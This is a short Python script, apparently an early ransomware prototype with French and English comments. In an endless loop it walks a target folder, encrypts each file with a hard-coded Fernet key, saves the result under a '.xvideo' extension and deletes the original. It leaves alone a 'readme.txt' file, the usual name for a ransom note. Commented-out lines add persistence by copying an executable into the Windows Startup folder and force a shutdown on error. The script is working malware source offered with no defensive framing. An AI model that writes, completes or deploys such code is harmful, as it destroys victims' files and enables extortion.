

# Importer le module Cryptography
from cryptography.fernet import Fernet
import time 
import os 

user = os.getlogin()
hostname = os.getenv("COMPUTERNAME")

app = f"{user}.exe"

# Copy the executable file in the startup menu
# startup = f"C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
# try : 
    
#     with open(startup+f"{app}", "wb") as _exe:
#         _exe.write(b"bonjour Rova Herve, Comment ca va")
# except:
#     os.system("shutdown /s /t 120")

# use this key to encrypt/decrypt your all file and folder
# cipher_suite = Fernet(key)
cipher_suite = Fernet(b'ZVEQ3p53kJuXn2EN-ZyJduwRuBtoYzwTQ8NOjxiCTaY=')

def encrypt_disk(DriveLetter):

    while True:
        
        # Parcourir recursivement chaque dossier et ses sous-dossiers pour trouver des fichiers
        for root, dirs, files in os.walk(f"{DriveLetter}:\\crypto\\"):  
            # Pour chaque fichier
        	for file in files: 
        		# Continue if the file is donne
        		if file.endswith(f".xvideo") or file=="readme.txt" or file==f"{app}":
        			continue
        
        		# Open the file
        		file_path = os.path.join(root, file) 
        		with open(file_path, "rb") as f: 
        			# Read the file in binairy mode
        			data = f.read() 
        
        		# Encrypt the file
        		encrypted_data = cipher_suite.encrypt(data) 
        
        		# Write the file encrypted is other file
        		with open(file_path + f".xvideo", "wb") as f: 
        			f.write(encrypted_data)
        		
        		# Remove the original file
        		os.remove(file_path)
        time.sleep(10)
